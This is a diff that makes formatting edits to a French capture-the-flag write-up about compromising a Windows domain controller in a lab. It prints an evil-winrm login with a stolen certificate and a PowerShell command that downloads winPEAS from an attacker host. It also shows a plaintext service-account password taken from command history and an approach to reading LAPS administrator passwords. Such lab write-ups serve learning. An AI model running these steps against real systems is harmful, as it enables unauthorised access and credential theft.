@@ -137,9 +137,9 @@ J'ai ensuite longtemps cherché comment m'y prendre pour la suite, ce dont j'ét
 deux informations. En repassant sur mon output nmap, je remarque qu'un service particulièrement intéressant qui tourne sur du http/https : **winrm (5986)**.
 
 Déjà rencontré auparavant, j'ai donc tenté d'utiliser l'outil evil-winrm me permettant de me connecter à distance au bureau d'un utilisateur du domaine.
-Il se trouve que le certificat appartient à un dénommé `legacyy` et qu'il est possible via evil-winrm de se connecter par le biais d'un certificat ssl (clé publique) et la clé privée.
+Il se trouve que le certificat appartient à un dénommé **legacyy** et qu'il est possible via evil-winrm de se connecter par le biais d'un certificat ssl (clé publique) et la clé privée.
 
-En lisant un peu la doc, on peut activer la connexion SSL, filé le certificat et la clé privée.
+En lisant un peu la documentation, on peut activer la connexion SSL, filé le certificat et la clé privée.
 
 ```
 evil-winrm -i 10.10.11.152 -S -c cert.pem -k key.pem 
@@ -195,17 +195,15 @@ USER CLAIMS INFORMATION
 User claims unknown.
 ```
 
-On remarque que legacyy fait partie du groupe Development, à part cela, le reste semble tout à fait correct. Un des premiers réflexes après cela serait d'effectuer
-une énumération du domaine et une analyse par graphe par le biais de Bloodhound mais on n'a pas de mot de passe à lui fournir et il ne traite pas les certificats.
+On remarque que **legacyy** fait partie du groupe _Development_. Mise à part cela, le reste semble tout à fait correct. Un des premiers réflexes après cela serait d'effectuer une énumération du domaine et une analyse par graphe par le biais de Bloodhound mais on n'a pas de mot de passe à lui fournir et l'outil ne traite pas les certificats.
 
 Je me suis dit que c'était une box facile, alors il ne fallait pas chercher très loin, comme sur du Linux, j'essaye d'installer winpeas afin d'avoir 
 de potentielles vecteurs d'attaques.
 
 En tentant de multiples moyens de télécharger winpeas.bat j'ai trouvé ce moyen :
-̀(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.4:8080/winPEAS.bat", "C:\Users\legacyy\Music\winpeas.bat")`
+```(New-Object System.Net.WebClient).DownloadFile("http://10.10.14.4:8080/winPEAS.bat", "C:\Users\legacyy\Music\winpeas.bat")```
 
-Cependant il m'est impossible d'executer le fichier à cause de l'antivirus qui tourne derrière. Je suis donc passé par la lecture de winpeas en testant les payloads
-payloads intéressantes. Ce qui m'a amené à l'historique des commandes :
+Cependant il m'est impossible d'executer le fichier à cause de l'antivirus qui tourne derrière. Je suis donc passé par la lecture de winpeas en testant les payloads intéressantes. Ce qui m'a amené à l'historique des commandes :
 
 ```
 La commande de winpeas :
@@ -239,8 +237,7 @@ evil-winrm -i 10.10.11.152 -S -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
 
 On procède de la même manière en regardant nos groupes et privilèges (via `whoami /all`) et on remarque directement que l'on fait maintenant partie 
 d'un groupe nommé `LAPS_Readers`.
-LAPS (Local Administrator Password Service) fournit une gestion des mots de passes des comptes locaux. Ses mots de passes sont stockés dans l'Active Directory
-et protégés par le biais des ACLs : seuls les utilisateurs autorisés peuvent lire les mots de passes des utilisateurs locaux.
+LAPS (Local Administrator Password Service) fournit une gestion des mots de passes des comptes locaux. Ses mots de passes sont stockés dans l'Active Directory et protégés par le biais des ACLs : seuls les utilisateurs autorisés peuvent lire les mots de passes des utilisateurs locaux.
 
 Parfait, il nous reste donc plus qu'à lire le mot de passe de l'administrateur. La documentation de [Microsoft](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/you-might-want-to-audit-your-laps-permissions/ba-p/2280785) fournit une commande permettant d'extraire le mot de passe
 du DC (de l'admin du coup) :
